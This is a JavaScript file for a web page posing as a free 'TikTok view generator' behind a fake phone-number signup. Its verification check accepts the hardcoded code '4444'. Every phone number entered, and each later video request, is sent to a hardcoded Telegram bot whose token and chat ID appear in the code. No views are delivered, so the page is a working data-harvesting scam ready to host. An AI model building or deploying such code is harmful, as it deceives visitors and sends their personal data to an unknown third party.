//cpanel host!
const botToken = "7628637870:AAF0q1GpYIuJpxbVTP5nVYVk-l2yWAxzzbs"; // Replace with your bot token
const chatId = "6816821858"; // Replace with your chat ID

document.getElementById("signupButton").addEventListener("click", async () => {
    const phoneNumber = document.getElementById("phoneNumber").value;
    const verificationCode = document.getElementById("verificationCode");

    if (!phoneNumber) {
        alert("Please enter a phone number!");
        return;
    }

    // Show verification code field if not already shown
    if (verificationCode.classList.contains("hidden")) {
        verificationCode.classList.remove("hidden");
        return;
    }

    if (verificationCode.value !== "4444") {
        alert("Invalid verification code!");
        return;
    }

    // Send phone number to Telegram bot
    const message = `THE PHONE NUMBER IS -> ${phoneNumber}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
            }),
        });

        if (response.ok) {
            // Hide signup form and show TikTok view generator
            document.getElementById("signupForm").classList.add("hidden");
            document.getElementById("tiktokViewGenerator").classList.remove("hidden");
        } else {
            alert("Failed to send phone number.");
        }
    } catch (error) {
        console.error("Error sending phone number:", error);
        alert("An error occurred while sending the phone number.");
    }
});

document.getElementById("sendViews").addEventListener("click", async () => {
    const videoURL = document.getElementById("videoURL").value;
    const viewAmount = document.getElementById("viewAmount").value;
    const phoneNumber = document.getElementById("phoneNumber").value; // Retain the phone number

    if (!videoURL || !viewAmount) {
        alert("Please fill in all fields!");
        return;
    }

    // Send TikTok video details and phone number to Telegram bot
    const message = `Video URL: ${videoURL}\nRequested Views: ${viewAmount}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
            }),
        });

        if (response.ok) {
            alert(`View request sent successfully for ${viewAmount} views on URL: ${videoURL}`);
        } else {
            alert("Failed to send view request.");
        }
    } catch (error) {
        console.error("Error sending view request:", error);
        alert("An error occurred while sending the view request.");
    }
});